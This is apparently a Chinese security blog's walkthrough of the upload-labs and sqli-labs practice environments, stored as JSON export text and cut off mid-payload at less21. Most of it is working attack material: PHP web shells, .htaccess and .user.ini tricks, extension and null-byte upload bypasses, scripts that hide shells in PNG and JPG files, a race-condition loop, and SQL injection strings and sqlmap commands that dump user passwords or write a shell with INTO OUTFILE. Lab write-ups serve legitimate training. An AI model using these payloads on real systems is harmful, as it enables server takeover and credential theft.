提示不让上传php,猜测是前端验证\n禁用js或者\n按下上传要检测，我们直接删掉onsubmit\n上传直接蚁剑连接\npass02 提示对数据包的MIME检查\nMIME Multipurpose Internet Mail Extensions\n多用途互联网邮件扩展类型\n客户端使用：\n1、GET请求不需要这个字段。\n2、POST请求头，放在Content Type字段用来指定上传的文件类型，方便服务器解析。放在Accept，告诉服务端允许接收的响应类型。比如只能接收json或者其他。\n服务端使用：\n放在响应头里面，Content Type告诉客户端响应的数据类型，方便客户端解析。\n官方解释：https://developermozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types\n所以用bp抓包，在我们上传的一句话木马的content-type中修改成image/jpeg，再放行\n蚁剑连接\npass03 黑名单里面有php\n等价拓展名 首先要修改apache的配置\n加上一行将后面这些拓展识别成php,不知道为什么不行\n换一种方式，把后缀名改为.htaccess，也不行\npass04 .htaccess .htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置 。通过 .htaccess 文件，可以实现：网页 301 重定向、自定义404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能\n先上传图片（shell.php改后缀为jpg)然后上传.htaccess\n1 2 3 \u0026lt;FilesMatch \u0026#34;shell.jpg\u0026#34;\u0026gt; SetHandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; 或者\n1 AddType application/x-httpd-php .jpg 1 SetHandler application/x-httpd-php 把图片匹配为php代码\npass05 查看提示存在readme.php\nphp.ini是php的一个全局配置文件，对整个web服务起作用\n而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的php.ini\n1 2 3 4 5 .user.ini 配置项中有两个配置可以起到一些作用 方法一： auto_prepend_file = \u0026lt;filename\u0026gt; //包含在文件头 方法二： auto_append_file = \u0026lt;filename\u0026gt; //包含在文件尾 上传要改php.ini\n下面那个原来是300秒我们改为10秒\n重启服务后\n上传两个文件\n蚁剑连接的文件要改为readme.php\n也可以用 php. . 点空格点 绕过上传\npass06 大小写过滤不全，用PHP就能上传\npass07 没有过滤空格，抓包后在bp里面把文件后缀加空格放行\n然后就连接上了\npass08 抓包改为.php.\npass09 后缀名未做去::$DATA处理\n1 Windows系统下，如果上传的文件名为`9.php::$DATA`会在服务器上生成一个9.php的文件，其内容和所上传文件内容相同并被解析。 连接时要把::$DATA去掉\npass10 因为会去掉末尾的点和头尾空格\n.php. .（点空格点）\npass11 后缀重写绕过\n.pphphp\npass12 需要php的版本号低于5.3.29，且magic_quotes_gpc为关闭状态（需要自己关闭）\nContent-Disposition 作为对下载文件的一个标识字段\n官方解释：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Disposition\n文件名截断 截断字符：chr(0) ，类似于C++的\u0026quot;\\0\u0026quot;\n在url编码里面所以要输入%00\n下面那里改成符合条件的后缀名，上面上传路径填写我们的木马然后用%00截断\npass13 现在路径不是url编码，要用16进制，先写个+占位，+的16进制是2b\nhex改为00\npass14 要上传图片马，并且利用文件包含漏洞来实现运行图片中的木马\n1 2 3 4 5 6 7 8 9 10 补充： Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。即为 .PNG Jpg图片文件包括2字节：FF D8。 Gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。 Bmp图片文件包括2字节：42 4D。即为 BM 图片马制作： 在cmd里执行 copy logo.jpg/b+test.php/a test.jpg logo.jpg为任意图片；test.php 插入的木马文件；test.jpg 生成的图片木马 linux里面用 cat logo.jpg shell.php\u0026gt;shell.jpg 上传完成后,在include.php后加上传的文件路径\n1 http://upload-labs/include.php?file=upload/xxx.jpg pass15 这里getimagesize()检查是否为图片文件\n1 2 getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。 主要是针对*.php直接更改文件后缀为图片后缀，上一题创建的图片马仍然可以使用。 pass16 1 2 exif_imagetype()读取一个图像的第一个字节并检查其后缀名。 返回值与getimage()函数返回的索引2相同，但是速度比getimage快 跟14一样\npass17 题目用二次渲染把我们图片马里面的马给清除了\ngif的解决办法\n上传图片然后下载回显图片\n用010editor对比，找到相同的地方（上传前和上传后，两张图片Hex仍然保持不变的位置）并插入木马\n我们直接用现成的图片马，利用文件包含，连接成功\n其他图片格式的办法参考upload-labs之pass 16详细分析 - 先知社区\npng脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y \u0026lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,\u0026#39;./1.png\u0026#39;); ?\u0026gt; 生成的木马是\n1 \u0026lt;?$_GET[0]($_POST[1]);?\u0026gt; jpg脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 \u0026lt;?php $miniPayload = \u0026#34;\u0026lt;?=phpinfo();?\u0026gt;\u0026#34;; if(!extension_loaded(\u0026#39;gd\u0026#39;) || !function_exists(\u0026#39;imagecreatefromjpeg\u0026#39;)) { die(\u0026#39;php-gd is not installed\u0026#39;); } if(!isset($argv[1])) { die(\u0026#39;php jpg_payload.php \u0026lt;jpg_name.jpg\u0026gt;\u0026#39;); } set_error_handler(\u0026#34;custom_error_handler\u0026#34;); for($pad = 0; $pad \u0026lt; 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-\u0026gt;readShort() != 0xFFD8) { die(\u0026#39;Incorrect SOI marker\u0026#39;); } while((!$dis-\u0026gt;eof()) \u0026amp;\u0026amp; ($dis-\u0026gt;readByte() == 0xFF)) { $marker = $dis-\u0026gt;readByte(); $size = $dis-\u0026gt;readShort() - 2; $dis-\u0026gt;skip($size); if($marker === 0xDA) { $startPos = $dis-\u0026gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(\u0026#39;_\u0026#39;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-\u0026gt;eof())) { if($dis-\u0026gt;readByte() === 0xFF) { if($dis-\u0026gt;readByte !== 0x00) { break; } } } $stopPos = $dis-\u0026gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage(\u0026#39;payload_\u0026#39;.$argv[1], $outStream)) { die(\u0026#39;Success!\u0026#39;); } else { break; } } } } unlink(\u0026#39;payload_\u0026#39;.$argv[1]); die(\u0026#39;Something\\\u0026#39;s wrong\u0026#39;); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(\u0026#39;/(\\d+) extraneous bytes before marker/\u0026#39;, $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-\u0026gt;binData = \u0026#39;\u0026#39;; $this-\u0026gt;order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die(\u0026#39;File not exists [\u0026#39;.$filename.\u0026#39;]\u0026#39;); $this-\u0026gt;binData = file_get_contents($filename); } else { $this-\u0026gt;binData = $filename; } $this-\u0026gt;size = strlen($this-\u0026gt;binData); } public function seek() { return ($this-\u0026gt;size - strlen($this-\u0026gt;binData)); } public function skip($skip) { $this-\u0026gt;binData = substr($this-\u0026gt;binData, $skip); } public function readByte() { if($this-\u0026gt;eof()) { die(\u0026#39;End Of File\u0026#39;); } $byte = substr($this-\u0026gt;binData, 0, 1); $this-\u0026gt;binData = substr($this-\u0026gt;binData, 1); return ord($byte); } public function readShort() { if(strlen($this-\u0026gt;binData) \u0026lt; 2) { die(\u0026#39;End Of File\u0026#39;); } $short = substr($this-\u0026gt;binData, 0, 2); $this-\u0026gt;binData = substr($this-\u0026gt;binData, 2); if($this-\u0026gt;order) { $short = (ord($short[1]) \u0026lt;\u0026lt; 8) + ord($short[0]); } else { $short = (ord($short[0]) \u0026lt;\u0026lt; 8) + ord($short[1]); } return $short; } public function eof() { return !$this-\u0026gt;binData||(strlen($this-\u0026gt;binData) === 0); } } ?\u0026gt; 运行脚本命令\n1 jpg_payload.php 1.jpg pass18 代码审计，传入文件与删除有时间差\n思路：\n条件竞争代码\n1 2 3 4 5 6 //18.php \u0026lt;?php fputs(fopen(\u0026#39;shell.php\u0026#39;,\u0026#39;w\u0026#39;),\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]) ?\u0026gt;\u0026#39;); ?\u0026gt; #访问18.php，会在目录下生成一个shell.php 用bp来重复上传\n发到intruder模块，payload设置为空，用于无限访问\n线程设置大点\n开始爆破，同时要手动访问文件\npython访问\n1 2 3 4 5 6 7 import requests url = \u0026#34;http://xxx.xxx.xxx.xxx/upload-labs/upload/18.php\u0026#34; while True: html = requests.get(url) if html.status_code == 200: print(\u0026#34;OK\u0026#34;) break pass19 原题有点问题\n改myupload的源码\n拼接/\n利用apach解析漏洞\n1 xxx.php.* -\u0026gt;xxx.php 然后我们bp不断上传白名单内的后缀\n例如shell.php.7z\n另一种思路，将上一关重复生成代码的木马做成图片马\n反复上传图片马\n这里访问的python脚本为：\n1 2 3 4 5 6 7 import requests url = \u0026#34;http://xxx.xxx.xxx.xx/upload-labs/include.php?file=upload/pass19.png\u0026#34; while True: html = requests.get(url) if ( \u0026#39;Warning\u0026#39; not in str(html.text)): print(\u0026#39;ok\u0026#39;) break 直到生成shell.php为止\npass20 利用函数漏洞\n1 move_uploaded_file()会忽略掉文件末尾的 /.，主要作用是将临时文件移到指定的目标路径，并确保文件在移动中不会被删除或覆盖。 所以我们上传shell.php/.上传后会变成shell.php\npass21 修改content-type 修改POST参数为数组类型，就是save_name[]; 索引[0]为shell.php， 索引[2]为jpg|png|gif。 只要第二个索引不为1，就是不能为save_name[1]; $file[count($file) - 1]就等价于$file[2-1]，值为空绕过\n漏扫工具 https://github.com/almandin/fuxploider\n防御 linux文件权限 ","date":"2024-10-09T00:00:00Z","image":"https://0d000721999.github.io/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png","permalink":"https://0d000721999.github.io/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"文件上传漏洞"},{"content":"sqli-labs靶场练习 less1 尝试单引号闭合，是字符型注入。\n判断字段数 找回显点\n收集信息\n爆破数据库 1 2 3 4 5 6 7 爆破数据库 ?id=-1\u0026#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+ group_concat()函数可以让多个数据在一行显示，但是只能显示64位，可以选择截取或者用limit的方式 显示全部数据 ?id=-1\u0026#39; union select 1,2,(schema_name) from information_schma.schemata limit 0,1--+ 爆破表名 1 2 3 爆破表名 ?id=-1\u0026#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+ 爆破字段名 1 2 3 爆破字段名 ?id=-1\u0026#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ 爆破字段 1 2 3 爆破字段 ?id=-1\u0026#39; union select 1,2,(select group_concat(username,0x7e,password)from users)--+ less1 sqlmap的运用 1 python sqlmap.py -u ip --batch//跳过询问 python环境打开\n1 2 猜解当前数据库名称 sqlmap.py -u ip --batch --current-db 1 2 猜解表名 sqlmap.py -u ip --batch -D \u0026#34;security\u0026#34; --tables 1 2 猜解字段 sqlmap.py -u ip -D \u0026#34;security\u0026#34; -T \u0026#34;users\u0026#34; --columns 1 2 脱库 sqmap.py -u ip -D \u0026#34;security\u0026#34; -T \u0026#34;users\u0026#34; --dump less2 数字型注入\n判断字段数\n1 ?id=1 or 1=2 order by 4--+ 找到回显点，信息收集\n1 ?id=-1 union select 1,2,3--+ 开始注入\n1 2 3 4 5 6 7 8 9 10 11 12 爆破数据库 ?id=-1 union select 1,2,group_concat(schema_name)from information_schema.schemata--+ 爆破表单名 ?id=-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+ 爆破字段 ?id=-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ 爆破字段内容 ?id=-1 union select 1,2,(select group_concat(username,0x7e,password)from users)- -+ less3 闭合方式是')\n判断字段数\n1 ?id=1\u0026#39;) and 1=1\torder by 4--+ 找回显点，信息收集，然后注入\n1 2 3 4 5 6 7 8 9 10 11 12 爆破数据库 ?id=1\u0026#39;) and 1=2 union select 1,version(),group_concat(schema_name)from information_schema.schemata--+ 爆破表单 ?id=1\u0026#39;) and 1=2 union select 1,version(),group_concat(table_name)from information_schema.tables where table_schema=database()--+ 爆破字段 ?id=1\u0026#39;) and 1=2 union select 1,version(),group_concat(colum_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;--+ 爆破数据 ?id=1\u0026#39;) and 1=2 union select 1,version(),(select group_concat(username,0x7e,password)from users)--+ less4 闭合方式是\u0026quot;)\n1 2 3 4 5 6 7 8 9 信息收集，字段判断，爆破数据库表 ?id=1\u0026#34;) and 1=2 union select 1,version(),group_concat(table_name)from information_schema.tables where table_schema=database()--+ 爆破字段 ?id=1\u0026#34;) and 1=2 union select 1,version(),group_concat(column_name)from information_schema.columns where table_name=\u0026#34;users\u0026#34;--+ 最后爆破出所有数据 ?id=1\u0026#34;) and 1=2 union select 1,version(),(select group_concat(username,0x7e,password)from users)--+ less5 没有用户和id的回显，查看有无报错回显，找到闭合方式\n闭合为单引号闭合，查字段数\n这边输入为假的条件看看\n查看源码，可以使用报错注入\n报错注入 报错常用的三个函数，extractvalue(),updatexml(),floor(),还有exp(),\n1. 用extractvalue函数进行报错注入。 1 2 3 爆破数据库 ?id=1\u0026#39; or/and extractvalue(1,concat(0x7e,database()/(select database()),0x7e))--+ 1 2 3 爆破数据库表 ?id=1\u0026#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e))--+ 1 2 3 爆破字段 ?id=1\u0026#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;),0x7e))--+ group-concat()函数可能放不下所有内容，可以采用截取或者limit函数读取\n1 2 3 爆破数据内容 ?id=1\u0026#39; or extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e))--+ 2. 用updatexml()函数进行报错注入 1 2 3 4 5 6 7 8 9 10 11 爆破数据库 ?id=1\u0026#39; or/and updatexml(1,concat(0x7e,database()/(select database()),0x7e),1)--+ 爆破数据库表 ?id=1\u0026#39; or updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)--+ 爆破字段 ?id=1\u0026#39; or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39;),0x7e),1)--+ 爆破数据内容 ?id=1\u0026#39; or updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)--+ 3.通过floor()函数进行报错注入，前提需要知道有多少字段数 1 2 3 爆破数据库 ?id=-1\u0026#39; union select 1,count(*),concat(0x7e,(database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+ 1 2 3 4 爆破数据库表 ?id=-1\u0026#39; union select 1,count(*),concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+ 1 2 3 4 爆破字段 ?id=-1\u0026#39; union select 1,count(*),concat(0x7e,(select (column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+ 1 2 3 爆破数据库内容 ?id=-1\u0026#39; union select 1,count(*),concat(0x7e,(select (username)from users limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+ sqlmap梭less5 -dbs枚举数据库 使用-o参数优化,\u0026ndash;batch参数进行跳过，\u0026ndash;threads参数开启更多线程\n1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 -o --threads=10 -dbs --batch 注意，耗时过久，主要是联合查询耗时，从结果看并没有联合查询注入。\n\u0026ndash;tables枚举数据库表 添加\u0026ndash;technique参数加速，\u0026ndash;dbms指定\n1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --dbms mysql --technique E -o --threads=10 -D security --tables --batch \u0026ndash;columns枚举列 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --dbms mysql --technique E -o -D security -T users --columns --batch \u0026ndash;dump枚举数据 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-5/?id=1 --dbms mysql --technique E -o -D security -T users -C username,password --dump --batch less6 把less5的单引号闭合改为双引号\nless7 看回显\nSQl注入的写入与读取\n读取文件 load_file(文件的路径)\n写入文件into outfile(),into_dumpfile()\n猜闭合方式是\u0026rsquo;))\n猜字段数\n通过页面回显布尔方式猜解到字段数为3，能够读写需要的几个条件\n需要高权限(root权限)\n需要有问价写入权限secure_file_priv不是NULL\n需要知道绝对路径\n魔术引号gbc时关闭的 magic_quotes_gpc = Off\n关键步骤：写入木马 1 2 ?id=1\u0026#39;)) and 1=2 union select 1,2,\u0026#34;\u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]) ?\u0026gt;\u0026#34;%20 into outfile \u0026#34;X:\\\\xx\\\\xx\\\\xx\\\\xx\\\\shell.php\u0026#34;--+ 小问题：文件无法写入 原因是MySQL数据库里\nsecure_file_priv 这个参数设置为了null或者没有设这个参数。\n写入后蚁剑提权。\n要将url后加shell.php才能连上\nless8 找到闭合方式为单引号，但是没有回显，因此报错注入的方法已经不能够实现注入\n对和错返回不同的页面回显，可以采用布尔盲注的方式\n布尔盲注 判断字段数\n字段数为3\n1 2 3 猜解数据库名字的长度 ?id=-1\u0026#39; or length(database())=8--+ 小tips：一那么采用逻辑或，因为无法确保前面的条件一定为真 1 2 3 4 5 6 逐一猜解数据库 ?id=-1\u0026#39; or ascii(substr(database(),1,1))=115--+ 或者 ?id=-1\u0026#39; or ascii(mid(database(),1,1))=115--+ 或者 ?id=-1\u0026#39; or mid(database(),1,1)=\u0026#39;s\u0026#39;--+ 按照相同的方法猜解数据表的名字和字段内容\n1 2 ?id=-1\u0026#39; or ascii(mid(select (table_name) from information_schema.tables where table_schema=database() limit 1,1))=?--+ 对于布尔盲注的问题，一般采用脚本进行猜解或者使用sqlmap\nsqlmap梭less8 -dbs枚举数据库 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 -o -dbs --batch \u0026ndash;tables枚举数据库表 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 --dbms mysql --technique B -o -D security --tables --batch \u0026ndash;columns枚举列 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 --dbms mysql --technique B -o -D security -T users --columns --batch \u0026ndash;dump枚举数据 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-8/?id=1 --dbms mysql --technique B -o -D security -T users -C username,password --dump --batch 关于sqlmap \u0026ndash;technique 参数 1 2 3 4 5 6 7 8 9 10 11 B：Boolean-based blind（布尔型注入） E：Error-based（报错型注入） U：Union query-based（可联合查询注入） S：Stacked queries（可多语句查询注入） T：Time-based blind（基于时间延迟注入） Q：Inline queries（嵌套查询注入） less9 怎么闭合都不对\n试试时间盲注\n1 2 例如 ?id=-1\u0026#39; or if(length(database())=8,sleep(5),0)--+ 发现界面有延迟\n1 2 3 猜解数据库名称 ?id=-1\u0026#39; or if(ascii(mid(database(),1,1))\u0026lt;=135,sleep(5),0)--+ 相同的方式猜解数据表数据字段 sqlmap梭less9 把参数改为T\nless10 与Less9的区别在于闭合方式为 双引号，同样是时间盲注\nless11 进入POST注入\n看见登入框，为方便注入，bp启动\n单引号闭合且字段数为2\n联合注入\nsqlmap的POST运用 1、指定探测注入点 1 2 3 4 5 6 7 8 9 10 方式一 启动sqlmap探测注入点 python sqlmap.py -u ip --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --batch 爆破当前数据库名 python sqlmap.py -u ip --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --batch --current-db 爆破数据表 python sqlmap.py -u ip --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --batch -D security --tables 最后脱库 python sqlmap.py -u ip --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --batch -D security -T users - -dump 2、将抓包内容保存到.txt文件中 1 2 启动sqlmap python sqlmap.py -r txt文件位置 -p 要扫描的点 1 2 3 4 5 6 爆破数据库 python sqlmap.py -r .txt文件位置 -p 扫描的位置 --current-db 爆破表 python sqlmap.py -r .txt文件位置 -p 扫描的位置 -D security --tables 脱库 pyhton sqlmap.py -r .txt文件位置 -p 扫描的位置 -D security --dump less12 闭合方式为\u0026quot;),还是bp启动\n联合注入和报错注入都行\n采用extractvalue()函数报错注入 1 2 查询数据库表 uname=-1\u0026#34;) or extractvalue(1,concat(0x7e,(select database()),0x7e)) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 1 2 爆破数据表 uname=-1\u0026#34;) or extractvalue(1,concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 2,1),0x7e)) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 1 2 爆破字段名 uname=-1\u0026#34;) or extractvalue(1,concat(0x7e,(select (column_name)from information_schema.columns where table_name=\u0026#39;uagents\u0026#39; limit 3,1),0x7e)) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 1 2 3 爆破字段 uname=-1\u0026#34;) or extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 用updatexml()函数进行报错注入 1 2 3 4 5 6 7 8 9 10 11 查询数据库表 uname=-1\u0026#34;) or updatexml(1,concat(0x7e,(select database()),0x7e),1) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 爆破数据表 uname=-1\u0026#34;) or updatexml(1,concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 2,1),0x7e),1) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 爆破字段名 uname=-1\u0026#34;) or updatexml(1,concat(0x7e,(select (column_name)from information_schema.columns where table_name=\u0026#39;uagents\u0026#39; limit 3,1),0x7e),1) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 爆破字段 uname=-1\u0026#34;) or updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 用floor()函数进行爆破 1 2 3 4 5 6 7 8 9 10 11 12 13 14 爆破数据库 uname=-1\u0026#34;) union select count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\u0026amp;passwd=admin\u0026amp;submit=Submit 爆破数据表 uname=-1\u0026#34;) union select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\u0026amp;passwd=admin\u0026amp;submit=Submit 爆破字段表 uname=-1\u0026#34;) union select count(*),concat(0x7e,(select column_name from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\u0026amp;passwd=admin\u0026amp;submit=Submit 爆破字段 uname=-1\u0026#34;) union select count(*),concat(0x7e,(select username from users limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\u0026amp;passwd=admin\u0026amp;submit=Submit less13 闭合方式改成‘），和less12一样\nless14 闭合方式改成\u0026quot;,和less12一样\nless15 通过图片回显闭合方式为单引号闭合\n正确的数据与错误数据页面回显的图片不一样，可以尝试一下布尔盲注\n1 uname=admin\u0026#39; and length(database())\u0026gt;=8--+\u0026amp;passwd=admin\u0026amp;submit=Submit 不猜了，直接sqlmap\nsqlmap梭less15 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --current-db 全选yes，直接爆破出时间盲注。\n1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; -D security --tables 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; -D security -T users --dump less16 闭合改为\u0026quot;),和less15一样\nless17 注入点变为密码的地方\nsqlmap梭less17 1 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt -p \u0026#34;passwd\u0026#34; -D security --dump less18 网页记录了本地ip的信息，说明可能是数据库记录了本机的信息，即后台获取了一些诸如Ip的信息保存到数据库中，并且页面返回了数据包user-agent的信息，那么在请求头中就可能存在注入点\n看源码\n源代码标识获取浏览器信息，即user-Agent部分，表示客户端通过什么浏览器向后台请求\n在后面的请求中也有将该部分进行存储添加到数据库，现在就可以通过一些手段在数据添加的同时进行注入\npayload改bp中uers-agent部分\n1 \u0026#39;and updatexml(1,concat(0x7e,database(),0x7e),1),1,1)# sqlmap头部注入 在头部注入爆破中，sqlmap需要提高扫描等级 level和risk\n1 2 3 level x(x为1-5) 当为2时会对头部的cookie进行扫描注入尝试，x\u0026gt;=3时队user-Agent,ip,referer 参数进行扫描 risk x(x 1-3) 1时进行大部分扫描 2会增加基于事件的测试语句 3会增加or语句的sql注入 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-18/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --level=3 --current-db 或者指定头部爆破\n1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-18/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --user-agent=\u0026#34;*\u0026#34; --thread=10 --dbs 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-18/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; -D security --tables 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-18/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; -D security -T users --dump 或者将数据包保存下来\n加上*号\n1 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt --batch --level=4 -D security -T users --dump less19 这次改referer\nsqlmap直接梭\n1 2 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-19/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --referer=\u0026#34;*\u0026#34; --thread=10 --dbs python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-19/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --referer=\u0026#34;*\u0026#34; -D security -T users --dump 或者数据包保存下来在referer后加*号\nless20 登入界面有明显提示，cookie注入\n知道字段数可以用floor函数进行报错注入\n1 2 爆破数据库名 Cookie: uname=admin\u0026#39; union select 1,count(*),concat(0x7e,(select database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x# 1 2 3 爆破表名 Cookie: uname=admin\u0026#39; union select 1,count(*),concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x# 1 2 3 爆破字段名 Cookie: uname=admin\u0026#39; union select 1,count(*),concat(0x7e,(select (column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x# 1 2 3 4 爆破字段内容 Cookie: uname=admin\u0026#39; union select 1,count(*),concat(0x7e,(select username/password from users limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x# sqlmap进行cookie注入 cookie注入时用level=2,在cookie后加*;\n1 2 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt --batch --level=2 -D security -T users --dump less21 登入进去发现cookie被加密了\n1 2 admin\u0026#39; and 1=1 order by 